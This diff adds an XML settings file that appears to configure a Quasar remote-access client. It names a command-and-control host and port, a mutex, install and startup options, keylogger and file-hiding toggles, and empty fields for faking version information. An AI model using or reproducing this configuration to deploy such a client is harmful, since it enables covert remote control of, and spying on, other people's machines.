@@ -1,0 +1,38 @@
+<settings>
+  <Tag>Office04</Tag>
+  <Hosts>213.146.43.249:4782;</Hosts>
+  <Delay>3000</Delay>
+  <Mutex>b6f87c84-9e33-4d0e-b227-a0d2bdd5b5e0</Mutex>
+  <UnattendedMode>False</UnattendedMode>
+  <InstallClient>False</InstallClient>
+  <InstallName>Client</InstallName>
+  <InstallPath>1</InstallPath>
+  <InstallSub>SubDir</InstallSub>
+  <HideFile>False</HideFile>
+  <HideSubDirectory>False</HideSubDirectory>
+  <AddStartup>False</AddStartup>
+  <RegistryName>Quasar Client Startup</RegistryName>
+  <ChangeIcon>False</ChangeIcon>
+  <IconPath>
+  </IconPath>
+  <ChangeAsmInfo>False</ChangeAsmInfo>
+  <Keylogger>False</Keylogger>
+  <LogDirectoryName>Logs</LogDirectoryName>
+  <HideLogDirectory>False</HideLogDirectory>
+  <ProductName>
+  </ProductName>
+  <Description>
+  </Description>
+  <CompanyName>
+  </CompanyName>
+  <Copyright>
+  </Copyright>
+  <Trademarks>
+  </Trademarks>
+  <OriginalFilename>
+  </OriginalFilename>
+  <ProductVersion>
+  </ProductVersion>
+  <FileVersion>
+  </FileVersion>
+</settings>
